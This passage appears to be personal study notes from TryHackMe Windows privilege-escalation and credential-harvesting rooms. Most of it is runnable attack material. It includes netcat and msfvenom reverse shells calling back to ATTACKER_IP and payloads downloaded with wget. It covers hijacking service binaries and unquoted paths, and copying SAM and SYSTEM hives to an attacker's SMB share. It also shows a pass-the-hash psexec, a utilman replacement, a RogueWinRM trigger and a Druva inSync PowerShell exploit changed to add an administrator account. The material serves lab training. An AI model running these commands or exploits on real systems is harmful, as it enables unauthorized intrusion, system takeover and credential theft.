as an example we have nc64.exe can be found on C:\tools as an example. Let's change the bat file to spawn a reverse shell:

example:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

example:
```
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, but if you have permission. We can run the task with the following command:

example:
```
schtasks /run /tn vulntask
```

And you will receive the reverse shell for an example with taskusr1 privileges as expected:

example:
```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

#### AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.


This method requires two registry values to be set. You can query these from the command line using the commands below.

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.243.175 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Abusing Service Misconfigurations

example:
```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can also be seen from Process Hacker:
![image](https://user-images.githubusercontent.com/24814781/181227961-ad43bb9e-47ca-4f7e-8d3d-29d3f442413f.png)


All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:
![image](https://user-images.githubusercontent.com/24814781/181228031-4eaaad3f-bfbc-4001-b112-f2cebe0c71e8.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.

#### Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:

example:
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with 
the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:

example:
```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

exmaple:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

example:
```
python3 -m http.server
```

example: (powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
obs: theres other ways to transfer the file, just remember that.


Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

example:
```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:

example:
```
nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, if you have privileges to restart the service yourself. Use the following commands from a cmd.exe command prompt:

example:
```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

example:
```
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

#### Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:

example:
```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:

example:
```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

![image](https://user-images.githubusercontent.com/24814781/181230650-ff2279aa-6a5d-490a-9fb2-c8c38d955340.png)

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

as an example, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:

example:
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
then:
```
nc -lvp 4446
```
Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

example:
```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Once the service gets restarted, your payload should execute:

example:
```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with example svcusr2 privileges:

example:
```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

#### Insecure Service Permissions
  
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use "Accesschk" 
```
https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
```
from the Sysinternals suite. The command to check for the thmservice service DACL is:

example:
```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
then:
```
nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in for an example C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

grant permission:

example:
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

example:
```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

example:
```
C:\> sc stop THMService
C:\> sc start THMService
```
And we will receive a shell back in our attacker's machine with SYSTEM privileges:

example:
```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

### Abusing dangerous privileges 

#### Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:
```
whoami /priv
```

A complete list of available privileges on Windows systems is available here:
```
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
```

From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project:
```
https://github.com/gtworek/Priv2Admin
```

#### SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

for an example, this account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

![image](https://user-images.githubusercontent.com/24814781/181478320-3cbb80d5-c23e-4226-887e-4fcd986458b8.png)

Once on the command prompt, we can check our privileges with the following command:

```
whoami /priv
```
example on how it can look:
```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:
example:
```
reg save hklm\system C:\Users\THMBackup\system.hive
```
example:
```
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
example:
```
mkdir share
```
or other way of using smbserver.py etc
```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
example:
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```
```
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:
example:
```
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
example
```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.42.32

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route.

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![image](https://user-images.githubusercontent.com/24814781/181480040-a70bee29-f974-470d-a9b6-159407a99437.png)

Once on the command prompt, we can check our privileges with the following command:
```
whoami /priv
```
example on how it can look:
```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

for this example we'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![image](https://user-images.githubusercontent.com/24814781/181480473-d94c149e-3122-410f-85a7-976393582355.png)

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

example:
```
takeown /f C:\Windows\System32\Utilman.exe
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
example
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```
C:\Windows\System32\> copy cmd.exe utilman.exe
```

To trigger utilman, we will lock our screen from the start button:

![image](https://user-images.githubusercontent.com/24814781/181480922-fbb84d81-246d-461c-a959-75adbbdc0431.png)

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![image](https://user-images.githubusercontent.com/24814781/181481008-57df11e4-ae7e-434f-9df4-73621d9705ce.png)

#### SeImpersonate / SeAssignPrimaryToken


These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

![image](https://user-images.githubusercontent.com/24814781/181481480-8edb0fa0-c6f4-4e2f-80da-4a6265613031.png)


There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

![image](https://user-images.githubusercontent.com/24814781/181481785-da9618aa-7e61-44ed-92b0-71918873823c.png)

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

```
https://github.com/antonioCoco/RogueWinRM
```
```
https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1
```

Let's start by an example and assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

example
"http://10.10.42.32/"

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:'

![image](https://user-images.githubusercontent.com/24814781/181482339-a261df55-e0df-4dce-bc6a-c57dde535204.png)


To use RogueWinRM, we first need to upload the exploit to the target machine. 

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

```
nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

example:
```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![image](https://user-images.githubusercontent.com/24814781/181483423-78f2b90c-e684-4102-930f-f94a6934d4c2.png)


Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

```
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

### Abusing vulnerable software 

#### Unpatched Software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```
wmic product get name,version,vendor
```

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db:
```
https://www.exploit-db.com/
```
packet storm
```
https://packetstormsecurity.com/
```

or plain old Google, amongst many others.

Using wmic and Google, can you find a known vulnerability on any installed product?

after this its hard to give an example, search up a known exploit for any program that is vulnerable and follow it and change the source code so it works for you and will do what ever you want the payload to to or etc.

for an example we will use 
Case Study: Druva inSync 6.6.3

The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string C:\ProgramData\Druva\inSync4\, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute C:\Windows\System32\cmd.exe, which is not in the allowed path; you could simply ask the server to run C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe and that would bypass the check successfully.

To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:

![image](https://user-images.githubusercontent.com/24814781/181486529-59fdd3bb-0deb-4d49-be5d-e62fe10f46f8.png)

The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.

Initially published by Matteo Malvica here:
```
https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html
```

the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:
```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it. Note that the exploit's default payload, specified in the $cmd variable, will create a user named pwnd in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this example, we will change the payload to run the following command:
```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

This will create user pwnd with a password of SimplePass123 and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user pwnd exists and is part of the administrators' group:

```
net user pwnd
```

As a last step, you can run a command prompt as administrator:

![image](https://user-images.githubusercontent.com/24814781/181487825-be4765a4-8799-48b0-9545-9340b112579d.png)

  
-------------------------------------------------------------------------------------------------------------------
# Credentials Harvesting tryhackme 
```
https://tryhackme.com/room/credharvesting
```

### Local Windows Credentials 
In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory. This task discusses credentials for local user accounts and demonstrates how they can be obtained.


### Keystrokes

Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can perform keylogging using tools like the Metasploit framework or others.

### Security Account Manager SAM
The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database. 

First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the c:\Windows\System32\config\sam file:
```
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

### Metasploits HashDump

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the rapid7 blog.
```
https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/
```
example: 
```        
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```

### Volume Shadow Copy Service

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the Microsoft documentation page 
```
https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
```
for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,

